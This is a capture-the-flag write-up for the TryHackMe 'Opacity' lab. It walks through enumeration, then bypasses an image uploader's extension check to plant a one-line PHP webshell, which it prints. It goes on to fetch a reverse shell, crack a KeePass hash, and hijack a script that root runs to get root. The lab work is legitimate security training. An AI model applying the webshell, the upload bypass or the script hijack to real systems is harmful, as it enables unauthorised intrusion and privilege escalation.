# Opacity

https://tryhackme.com/room/opacity

This is rated EASY at time of writing, but I expect it might get bumped. Not too tricky, some basic fundamentals.

1. Scanning reveals 22, 80, 139 and 445. The samba ports dont reveal much, but if run with `enum4linux` you will get a valid system username thats interesting but not useful.
2. On 80 you are redirected to a login form. This held me up for a while, because I was running my enumeration wrong; there is a subdirectory under /cloud that you can find with ffuf, however I was using `-ac` for automatic calibration that unfortunately calibrated the redirect from /cloud to /cloud/ as being a non-report, and so it took me much longer than it should have to find this directory.
3. /cloud hosts a image uploader: you give it a image url, and if its a valid image extension the image is downloaded from that url and hosted under /cloud/images/image_name for a short period of time (its deleted after possibly 5 seconds, along with everything else in that directory). To exploit this, I created `test.php` on the attack box containing a simple webshell (`<?php system($_GET[1]) ?>`), hosted a webserver, then gave a url like `10.10.63.79:1234/test.php#00.jpg` to bypass the check (using a null byte). This worked and I got a webshell under /cloud/images/test.php for short periods of time.
4. Using the temporary webshell I downloaded a revshell payload using wget to /tmp, made it executable and ran it (using several upload webshells as they were deleted). This got me a rev shell on the system as www-data.
5. The other user was the user that had been detected earlier, sysadmin. This user had a scripts folder under their home directory, and pspy64 revealed that root was running the script.php inside this folder every minute. Further enumeration found a keepass xc database under /opt, owned by sysadmin.
6. Exfiltrating this database and running keepass2john on it gave me a hash, which I cracked with john the ripper and rockyou - normally this would be avoided as keepass databases are designed to be very hard to crack, but a password was found quickly and I was able to open the database and retrieved sysadmin's user password.
7. As sysadmin I was able to get the local flag. The scripts folder was owned by root, and its contents could not be modified. However, as the folder was inside sysadmin's home dir, I could move it so I moved/renamed it to scripts2, then created my own scripts folder. In a new script.php file I added php to run my revshell payload.
8. This relatively quickly got called by root and I got a root revshell, retrieving the final flag.

Pretty simple, though the enum tripped me up. I wasn't particularly distracted by the SMB, which I assume was a red herring designed to distract.
